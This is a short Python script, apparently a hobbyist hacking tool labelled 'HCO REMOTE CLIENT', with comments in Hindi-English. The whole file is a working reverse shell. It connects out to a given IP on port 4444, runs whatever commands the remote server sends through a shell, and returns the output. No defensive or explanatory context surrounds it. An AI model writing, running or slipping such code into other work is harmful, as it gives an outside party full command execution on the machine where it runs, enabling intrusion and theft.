import socket
import subprocess

def run_client():
    print("""
    =========================================
          HCO REMOTE CLIENT (Interactive)    
    =========================================
    """)
    
    # User se dynamic IP mangega
    server_ip = input("[?] Enter Server IP (e.g., 192.168.1.10): ").strip()
    port = 4444
    
    print(f"[*] Connecting to server at {server_ip}:{port}...")
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        client.connect((server_ip, port))
        print("[+] Connected to Server Successfully!\n")
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return
    
    while True:
        try:
            command = client.recv(1024).decode()
            if not command or command.lower() == 'exit':
                break
            
            # Command execute karke output bhejna
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        except Exception as e:
            output = str(e).encode()
            
        client.send(output)
        
    client.close()

if __name__ == "__main__":
    run_client()
